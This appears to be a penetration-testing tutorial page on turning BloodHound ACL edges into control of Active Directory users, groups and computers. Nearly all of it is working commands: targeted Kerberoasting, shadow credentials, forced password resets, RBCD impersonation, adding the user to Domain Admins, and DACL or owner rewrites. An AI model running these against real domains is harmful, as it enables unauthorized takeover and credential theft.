---
title: Abuse Active Directory ACLs
slug: abuse-ad-acls
area: active-directory
module: 13
order: 3
goal: Turn a BloodHound "object control" edge (GenericAll, GenericWrite, WriteDacl…) into control of a user, group or computer.
summary: How to abuse AD rights — each edge has a one-command exploit: reset a password, add yourself to a group, set a fake SPN, add shadow credentials or take ownership, from Windows or Linux.
prereqs: [A BloodHound edge from a principal you control to a target, The target type (user/group/computer), PowerView (Windows) or Impacket/bloodyAD (Linux)]
seeAlso: [tool:acl-abuse, tool:bloodhound, tool:certipy, howto:enumerate-ad, howto:roast-kerberos, map:active-directory]
references:
  - The Hacker Recipes: DACL abuse | https://www.thehacker.recipes/ad/movement/dacl/
  - BloodHound edges | https://bloodhound.specterops.io/resources/edges/overview
---

BloodHound's outbound-control edges are direct privilege — each has a specific abuse. Read the edge, run the matching command, clean up afterwards, and repeat along the path to Domain Admin.

## GenericAll / GenericWrite over a USER

Prefer the quiet options (targeted Kerberoast, shadow creds) over a disruptive password reset.

```bash
# targeted Kerberoast: set a fake SPN, roast, clear it
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}   # PowerView
Rubeus.exe kerberoast /user:victim /nowrap
# shadow credentials (if AD CS present) — gets a cert + NT hash, no reset
certipy shadow auto -u you@corp.local -p pass -account victim -dc-ip DCIP
# last resort: force a password reset (disruptive)
net rpc password victim 'NewPass123!' -U 'corp.local/you%pass' -S DC
```

## GenericAll / GenericWrite over a COMPUTER

```bash
# RBCD: let a machine you control impersonate any user to this host
impacket-addcomputer corp.local/you:pass -computer-name 'FAKE$' -computer-pass 'Fake123'
impacket-rbcd corp.local/you:pass -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write
impacket-getST -spn cifs/target.corp.local -impersonate Administrator 'corp.local/FAKE$:Fake123'
```

## AddMember / GenericWrite over a GROUP

```bash
Add-DomainGroupMember -Identity 'Domain Admins' -Members you          # PowerView
net rpc group addmem 'Domain Admins' you -U 'corp.local/you%pass' -S DC
# remove yourself afterwards
```

## WriteDacl / WriteOwner

```bash
Set-DomainObjectOwner -Identity victim -OwnerIdentity you             # take ownership
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity you -Rights All
# Linux: impacket-owneredit  then  impacket-dacledit
```

## If it fails

- **"Access denied" on the abuse**: re-check the edge direction/right in BloodHound — you may control a *group* that has the right, so act as a member.
- **Password reset locks you out of stealth**: use shadow credentials or targeted Kerberoast instead where the right allows.
- **RBCD getST fails**: MachineAccountQuota may be 0 — use an existing computer account you control, or another edge.
- **Changes not taking**: replication delay — target the right DC, and allow a moment.

## Verify

Dump the victim's hash (roast/shadow), log in as the new group member, or S4U as admin to the target host. Then continue the path — often straight to DCSync.
